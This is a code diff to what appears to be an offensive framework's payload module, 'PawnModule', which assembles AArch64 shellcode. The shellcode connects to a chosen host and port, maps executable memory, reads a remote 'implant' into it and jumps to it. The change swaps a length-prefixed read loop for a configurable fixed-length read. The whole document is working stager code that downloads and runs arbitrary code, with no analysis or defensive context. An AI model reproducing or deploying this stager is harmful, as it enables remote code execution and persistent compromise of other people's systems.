@@ -26,6 +26,7 @@ class PawnModule(Module, Assembler):
 
         self.host = IPv4Option(None, 'Host to connect to.', True)
         self.port = PortOption(None, 'Port to connect to.', True)
+        self.length = IntegerOption(4096, 'Length of the implant.', True)
         self.reliable = BooleanOption('yes', 'Make payload reliable.', True)
 
     def run(self):
@@ -49,29 +50,9 @@ class PawnModule(Module, Assembler):
                 cbnz w0, fail
             """)
 
-        payload += dedent("""\
-            mov x0, x12
-            sub sp, sp, 0x10
-            mov x1, sp
-            mov x2, 4
-            mov x8, 0x3f
-            svc 0
-        """)
-
-        if self.reliable.value:
-            payload += dedent("""\
-                cmn x0, 1
-                beq fail
-            """)
-
         payload += dedent(f"""\
-            ldr w2, [sp, 0]
-            lsr x2, x2, 12
-            add x2, x2, 1
-            lsl x2, x2, 12
-
             mov x0, xzr
-            mov x1, x2
+            mov x1, {hex(self.length.value)}
             mov x2, 7
             mov x3, 0x22
             mov x4, xzr
@@ -86,15 +67,13 @@ class PawnModule(Module, Assembler):
                 beq fail
             """)
 
-        payload += dedent("""\
-            ldr w4, [sp]
+        payload += dedent(f"""\
             str x0, [sp]
             mov x3, x0
 
-        read:
             mov x0, x12
             mov x1, x3
-            mov x2, x4
+            mov x2, {hex(self.length.value)}
             mov x8, 0x3f
             svc 0
         """)
@@ -106,10 +85,6 @@ class PawnModule(Module, Assembler):
             """)
 
         payload += dedent("""\
-            add  x3, x3, x0
-            subs x4, x4, x0
-            bne read
-
             ldr x0, [sp]
             blr x0
         """)
